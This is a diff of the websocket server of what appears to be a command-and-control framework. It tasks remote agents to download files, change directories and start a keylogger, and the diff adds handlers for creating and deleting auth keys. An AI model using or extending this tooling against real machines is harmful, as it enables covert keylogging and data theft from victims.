@@ -5,6 +5,7 @@
 
 import {Server} from 'socket.io';
 import User, * as userModel from '../models/user.js';
+import Key, * as keyModel from '../models/key.js';
 import Agent, * as agentModel from '../models/agent.js';
 import Task, * as taskModel from '../models/task.js';
 import File, * as fileModel from '../models/file.js';
@@ -133,34 +134,34 @@ export const setupWS = (httpServer) => {
             await taskModel.deleteAllTasks(agentID);
             await fileModel.deleteAllFiles(agentID);
           }).catch(error => {
-            socketServer.emit("striker_error", error.message);
+            client.emit("striker_error", error.message);
           });
         }else if (input.startsWith("download ")){ // Task an agent to upload a file to the server.
           let filename = input.substr(9).trim();
           taskModel.createTask(username, {
             agentID, taskType: "download", data: {file: filename}
           }).catch(error => {
-            socketServer.emit("striker_error", error.message);
+            client.emit("striker_error", error.message);
           });
         }else if (input.startsWith("writedir ")){ // Change the write dir of an agent.
           let dir = input.substr(9).trim();
           taskModel.createTask(username, {
             agentID, taskType: "writedir", data: {dir}
           }).catch(error => {
-            socketServer.emit("striker_error", error.message);
+            client.emit("striker_error", error.message);
           });
         }else if (input.startsWith("keymon ")){ // Start a keylogger.
           let duration = parseInt(input.substr(7).trim());
           taskModel.createTask(username, {
             agentID, taskType: "keymon", data: {duration}
           }).catch(error => {
-            socketServer.emit("striker_error", error.message);
+            client.emit("striker_error", error.message);
           });
         }else if (input === "abort"){
           taskModel.createTask(username, {
             agentID, taskType: "abort"
           }).catch(error => {
-            socketServer.emit("striker_error", error.message);
+            client.emit("striker_error", error.message);
           });
         }else{ // Unknown query
           socketServer.emit("agent_console_output", {
@@ -174,9 +175,23 @@ export const setupWS = (httpServer) => {
       }
     });
 
+    // For creating an auth key.
+    client.on("create_authkey", (data) => {
+
+      keyModel.createKey(data.key, data.keyType, username).catch(error => {
+        client.emit("striker_error", error.message);
+      });
+    });
+
+    client.on("delete_authkey", (key) => {
+
+      keyModel.deleteKey(key).catch(error => {
+        client.emit("striker_error", error.message);
+      });
+    });
+
     // For queuing a prepared task for an agent.
     client.on("create_task", (data) => {
-
        taskModel.createTask(username, data).catch(error => {
         client.emit("striker_error", error.message);
       });
